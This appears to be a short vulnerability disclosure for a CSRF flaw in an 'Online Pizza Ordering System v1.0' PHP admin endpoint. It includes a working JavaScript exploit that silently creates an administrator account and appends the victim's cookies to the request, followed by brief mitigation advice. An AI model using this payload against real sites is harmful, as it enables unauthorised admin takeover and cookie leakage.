# Online Pizza Ordering System has CSRF vulnerability

## CSRF vulnerability

BUG_Author: Murasaki

URL：http://localhost/php-opos/admin/ajax.php?action=save_user

Link:https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html

There is a CSRF vulnerability in the Online Pizza Ordering System v1.0.

When the administrator is logged in, open the created JS script file to complete the operation of adding an administrator.When the administrator is logged in, open the specified JS script file to complete a series of operations that require permissions, such as adding an administrator.

The CSRF vulnerability can complete various permission operations in the background when combined with the stored XSS vulnerability, which seriously affects business processes and permission management.


![(before.png)](https://github.com/1MurasaKi/PizzaCSRF_Pic/blob/main/before.png?raw=true)

![(after.png)](https://github.com/1MurasaKi/PizzaCSRF_Pic/blob/main/after.png?raw=true)

# Exploit
```
<script>
    xhr = new XMLHttpRequest();
    xhr.open("post", "http://localhost/php-opos/admin/ajax.php?action=save_user", true);  
    xhr.setRequestHeader('content-type', 'application/x-www-form-urlencoded'); 
    xhr.send("entry=" + document.cookie + "id=&name=1234&username=1234&password=1234&type=1"); 
</script>
```

# Suggestion
* Verify the origin of the request
* Use token credentials
* Add validation for key operations
